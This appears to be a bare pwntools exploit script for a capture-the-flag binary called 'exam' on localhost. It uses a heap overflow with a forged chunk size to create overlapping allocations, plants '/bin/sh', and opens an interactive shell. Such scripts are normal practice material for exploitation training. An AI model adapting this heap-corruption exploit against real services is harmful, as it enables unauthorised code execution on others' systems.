from pwn import *
import sys

def leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(r.leak(addr, size), begin=addr, skip=False)

IP = '127.0.0.1'
PORT = 10101
FN = './exam'

if len(sys.argv)>2:
    r = remote(IP,PORT)
else:
    r = process(FN)

c0 = lambda: r.recvuntil('>')
s = lambda x: r.sendline(str(x))

def add(msg):
    s(1)
    c0()
    s(msg)
    c0()

def remove(idx):
    s(2)
    c0()
    s(idx)
    c0()

def crib():
    s(4)
    c0()

add('AAAA')
crib()
add('AAAA')
add('AAAA')

remove(1)
add("A"*0x78 + p64(0x90+0x90+0x20) + "\x90")

remove(0)
remove(2)

add('AAAA')
add('A'*0x18+'ITSMAGIC'+'/bin/sh\00')
s(6)
c0()
s(1)

r.interactive()
